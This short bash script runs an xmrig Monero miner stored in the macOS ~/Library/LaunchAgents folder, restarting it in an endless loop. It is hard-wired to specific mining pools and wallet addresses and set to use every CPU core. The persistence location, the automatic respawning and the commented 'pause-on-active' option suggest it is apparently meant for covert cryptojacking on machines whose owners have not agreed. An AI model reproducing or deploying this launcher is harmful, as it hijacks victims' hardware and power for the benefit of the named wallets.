#!/usr/bin/env bash

#in case it crashes
while true
do
#~/Library/LaunchAgents/xmrig -o stratum+tcp://randomxmonero.usa-east.nicehash.com:3380 -u 3HLKDVH6J89nUJMGi8M1gSqmLxdN5PBhFc -p x -a rx/0 --coin null -t $(sysctl -n hw.ncpu) --nicehash --keepalive --rig-id $(whoami) --pause-on-battery --pause-on-active 10 --cpu-priority 5
~/Library/LaunchAgents/xmrig --url pool.hashvault.pro:80 --user 41hqShqNGhmjZfA8wP5bZHL918CUdbJwoiVUc6Bxh7mMh6FnoGz4rD3hV8nK1ZSFRejReGKKvGv4YZUxeE8rnLSaQ7HqhmB --pass 123nn --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --cpu-priority 5 -t $(sysctl -n hw.ncpu)
done
